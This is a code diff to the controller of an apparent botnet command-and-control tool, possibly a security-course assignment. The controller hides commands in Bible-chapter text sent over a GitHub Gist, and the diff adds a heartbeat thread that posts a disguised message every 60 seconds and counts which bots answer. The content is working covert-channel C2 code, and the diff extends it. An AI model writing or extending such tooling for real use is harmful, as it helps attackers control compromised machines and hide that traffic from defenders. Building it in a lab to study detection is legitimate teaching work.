@@ -1,16 +1,21 @@
 import sys
 import uuid
+from threading import Thread
+from time import sleep
+from datetime import datetime
 
 sys.path.append('..')
-from common.utils import add_message, check_chat_file, get_reply_to_msg_id, read_attachment
+from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment
 from common.utils import CONTROLLER_NICK_NAME
 from common.gist import init_gist
 from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
 from common.steganography import encode_to_text, decode_from_text
 
 
-# TODO - heartbeat
+HEARTBEAT_TIME = 60
+
 # TODO - reset Gist command
+
 
 def encode_path(pth):
     chapter_for_encoding = get_chapter_for_path_encoding()
@@ -43,8 +48,8 @@ def process_cmd(cmd):
 
     elif len(cmd_parts) == 2 and cmd_parts[0] == 'decode' and cmd_parts[1].isdigit():
         msg_id = int(cmd_parts[1])
-        print(f'Decoding reply for message {msg_id}...')
-        replies = get_reply_to_msg_id(msg_id)
+        print(f'Decoding replies for message {msg_id}...')
+        replies = get_replies_to_msg_id(msg_id)
         if len(replies) == 0:
             print(f'No reply for message {msg_id} found', flush=True)
         else:
@@ -58,11 +63,25 @@ def process_cmd(cmd):
         print(f'Unknown command: {cmd}', flush=True)
 
 
+def check_heartbeat():
+    while True:
+        msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
+        now = datetime.now()
+        sleep(HEARTBEAT_TIME)
+        replies = get_replies_to_msg_id(msg_id)
+        bot_names = list(map(lambda x: x[0], replies))
+        bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
+        print(f'Active bots ({now}): {len(bot_names)}{bot_names_str}')
+
+
 def run():
     print('Controller is starting...')
     init_gist()
     check_chat_file()
     print(f'Controller is running as {CONTROLLER_NICK_NAME}...')
+
+    heartbeat_thread = Thread(target=check_heartbeat, daemon=True)
+    heartbeat_thread.start()
 
     while True:
         cmd = input('BSY CC > ')
